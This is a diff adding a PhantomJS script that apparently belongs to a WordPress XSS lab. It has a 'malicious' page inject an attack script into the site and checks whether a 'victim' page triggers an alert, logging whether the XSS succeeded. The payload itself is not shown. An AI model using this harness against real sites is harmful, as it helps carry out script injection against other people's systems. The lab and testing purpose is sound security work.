@@ -1,0 +1,35 @@
+#!/usr/bin/env phantomjs
+
+var wp = require( './wp' );
+
+var visitorPage = wp.page( 'VICTIM' );
+var maliciousPage = wp.page( 'MALICIOUS' );
+
+var success = false;
+
+visitorPage.onAlert = function( msg ) {
+	success = true;
+};
+
+setTimeout( function() {
+	if ( success ) {
+		console.log( "XSS Successfully Exploited" );
+		phantom.exit();
+	} else {
+		console.log( "XSS Unsuccessfully Exploited" );
+		phantom.exit( 1 );
+	}
+}, 5000 );
+
+console.log( "Victim: viewing homepage" );
+visitorPage.open( wp.url );
+
+console.log( "Malicious: viewing homepage" );
+maliciousPage.open( wp.url, function() {
+	setTimeout( function() {
+		console.log( "Malicious: injecting attacks/3-xss-js.js" );
+		maliciousPage.evaluate( function( url ) {
+			jQuery.getScript( url + 'attacks/3-xss-js.js' );
+		}, wp.url );
+	}, 1000 );
+} );
